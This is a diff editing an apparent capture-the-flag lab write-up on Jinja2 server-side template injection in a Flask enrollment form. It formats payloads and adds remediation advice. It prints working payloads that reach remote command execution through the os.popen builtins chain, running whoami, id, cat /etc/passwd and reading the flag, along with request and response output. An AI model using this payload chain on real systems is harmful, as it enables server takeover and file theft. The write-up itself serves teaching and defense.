@@ -40,10 +40,14 @@ The endpoint accepted user input through a daycare inquiry form.
 
 ## Initial SSTI Testing
 
-A basic SSTI payload was injected into the `name` parameter:
+A basic SSTI payload was injected into the `name` parameter.
+
+### Payload
 
 ```python
+{% raw %}
 {{7*7}}
+{% endraw %}
 ```
 
 ### Request
@@ -53,10 +57,10 @@ POST /enroll HTTP/2
 Host: 424efb99-4065-sunnyside-14172.events.webverselabs-pro.com
 Content-Type: application/x-www-form-urlencoded
 
-name={{7*7}}&parent_email=kelvin@kel.com&child_age=under-18m&program=Infants&preferred_start=2026-05-07&message=
+name=%7B%7B7*7%7D%7D&parent_email=kelvin@kel.com&child_age=under-18m&program=Infants&preferred_start=2026-05-07&message=
 ```
 
-### Application Response
+### Response
 
 ```text
 Thank you, 49!
@@ -68,10 +72,14 @@ The payload was evaluated server-side, confirming SSTI.
 
 ## Template Engine Identification
 
-To identify the template engine, the following payload was used:
+To identify the template engine, the following payload was used.
+
+### Payload
 
 ```python
+{% raw %}
 {{7*'7'}}
+{% endraw %}
 ```
 
 ### Response
@@ -91,16 +99,20 @@ The backend was therefore confirmed to be using Jinja2.
 
 ## Accessing Flask Configuration
 
-Next, Flask configuration values were accessed using:
+Next, Flask configuration values were accessed through the template context.
+
+### Payload
 
 ```python
+{% raw %}
 {{config}}
+{% endraw %}
 ```
 
 ### Response
 
 ```python
-Thank you, <Config {'DEBUG': False, 'TESTING': False, 'SECRET_KEY': None ...}>!
+Thank you, <Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': None ...}>!
 ```
 
 This confirmed:
@@ -118,7 +130,9 @@ Using Jinja2 object traversal, arbitrary Python imports were possible.
 ### Payload
 
 ```python
+{% raw %}
 {{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}
+{% endraw %}
 ```
 
 ### Response
@@ -133,10 +147,14 @@ This confirmed successful command execution on the underlying server.
 
 ## User Enumeration
 
-The `id` command was executed:
+The `id` command was executed to enumerate the running application user.
+
+### Payload
 
 ```python
+{% raw %}
 {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{% endraw %}
 ```
 
 ### Response
@@ -151,12 +169,14 @@ The application was running as the `sunnyside` user.
 
 ## Reading System Files
 
-The vulnerability allowed arbitrary file access.
+The vulnerability allowed arbitrary file access from the underlying operating system.
 
 ### Payload
 
 ```python
+{% raw %}
 {{request.application.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}}
+{% endraw %}
 ```
 
 ### Response
@@ -164,6 +184,7 @@ The vulnerability allowed arbitrary file access.
 ```text
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
 ...
 sunnyside:x:1100:1100::/home/sunnyside:/bin/bash
 ```
@@ -174,10 +195,14 @@ This verified unrestricted command execution and filesystem access.
 
 ## Locating the Flag
 
-The root directory was enumerated using:
+The root directory was enumerated to identify sensitive files.
+
+### Payload
 
 ```python
+{% raw %}
 {{request.application.__globals__.__builtins__.__import__('os').popen('ls /').read()}}
+{% endraw %}
 ```
 
 ### Response
@@ -197,7 +222,9 @@ The flag file was read directly from the filesystem.
 ### Payload
 
 ```python
+{% raw %}
 {{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}
+{% endraw %}
 ```
 
 ### Response
@@ -254,6 +281,7 @@ This vulnerability represents critical severity due to direct remote code execut
 Developers should:
 
 - Never render user-controlled input directly into templates
+- Avoid using `render_template_string()` with user input
 - Use safe rendering functions
 - Enable template sandboxing
 - Avoid exposing dangerous Python objects to templates
@@ -273,7 +301,7 @@ Additionally:
 
 Jinja2 SSTI vulnerabilities are among the most dangerous web application issues because they often lead directly to remote code execution.
 
-Flask applications are especially vulnerable when developers dynamically build templates using user input with functions such as:
+Flask applications are especially vulnerable when developers dynamically build templates using functions such as:
 
 ```python
 render_template_string()
